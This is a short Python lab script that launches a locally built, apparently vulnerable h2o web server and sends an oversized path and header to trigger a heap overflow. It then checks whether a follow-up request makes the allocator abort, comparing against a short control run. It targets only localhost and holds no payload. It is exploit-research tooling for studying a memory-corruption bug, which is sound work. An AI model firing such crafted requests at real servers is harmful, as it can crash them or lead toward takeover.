#!/usr/bin/env python3
"""Throwaway: after the forced-heap overflow corrupts the top size, does the
next request's allocator activity abort?  Plain pinned build stays alive across
the overflow, so a second loopback request exercises the allocator with the
corrupted top.  Run twice: `overflow` (req1 overflows) and `control` (both short).
No rung-5 claim; structural negative test."""
import os
import socket
import subprocess
import sys
import time
import urllib.request

ROOT = "/home/mesh-home/mishe-tauftauf2shell/lab/frontier/h2o2shell"
PORT = 17999
BIN = f"{ROOT}/src/vuln/build-plain/h2o"
conf = f"{ROOT}/live/forced-heap.conf"
errlog = f"{ROOT}/live/forced-heap-error.log"
mode = sys.argv[1] if len(sys.argv) > 1 else "overflow"
outpath = f"{ROOT}/live/top-reuse-{mode}.out"
# req1: overflow layout (17-byte stop over 8192-byte line) vs short control
p1, l1 = (1200, 6870) if mode == "overflow" else (8, 8)

for p in (errlog, outpath):
    try:
        os.remove(p)
    except FileNotFoundError:
        pass
with open(outpath, "wb") as out:
    proc = subprocess.Popen([BIN, "-c", conf], stdout=out, stderr=subprocess.STDOUT)
    for _ in range(100):
        try:
            s = socket.create_connection(("127.0.0.1", PORT), 0.2)
            s.close()
            break
        except OSError:
            time.sleep(0.1)
    else:
        print("SERVER_NOT_READY")

    def req(path_len, header_len):
        r = urllib.request.Request(
            f"http://127.0.0.1:{PORT}/" + "A" * path_len,
            headers={"pad": "B" * header_len},
        )
        try:
            with urllib.request.urlopen(r, timeout=8) as resp:
                return f"HTTP {resp.status}"
        except Exception as e:
            return f"REQ_FAIL {e!r}"

    print(f"[{mode}] req1 ({'overflow' if mode=='overflow' else 'short'}):", req(l1, p1))
    time.sleep(0.5)
    print(f"[{mode}] alive after req1:", proc.poll() is None, "rc", proc.poll())
    print(f"[{mode}] req2 (short):", req(8, 8))
    # wait up to 6s for an abort to fully terminate the process
    for _ in range(60):
        if proc.poll() is not None:
            break
        time.sleep(0.1)
    print(f"[{mode}] final alive:", proc.poll() is None, "rc", proc.poll())
    if proc.poll() is None:
        proc.kill()
    proc.wait()

print(f"--- [{mode}] error-log tail ---")
try:
    tail = "".join(open(errlog, errors="replace").readlines()[-6:])
except FileNotFoundError:
    tail = "(no error log)"
print(tail)
with open(f"{ROOT}/live/top-reuse-{mode}-errlog.txt", "w") as f:
    f.write(tail)
